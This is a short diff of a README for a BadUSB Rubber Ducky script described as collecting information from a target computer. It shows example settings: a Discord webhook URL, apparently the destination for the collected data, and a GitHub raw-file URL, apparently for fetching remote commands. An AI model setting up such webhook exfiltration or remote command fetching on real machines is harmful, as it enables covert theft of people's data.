@@ -12,6 +12,7 @@ This BadUSB Rubber Ducky script is designed to swiftly collect information from 
 EXAMPLE:
 
 `$hookUrl = "https://discord.com/api/webhooks/120056/HOw7_j7W-jMllc-uZMbCWq1DEYJUuKj"`
+
 `$url = "https://github.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/raw/main/command.txt"`
 
 
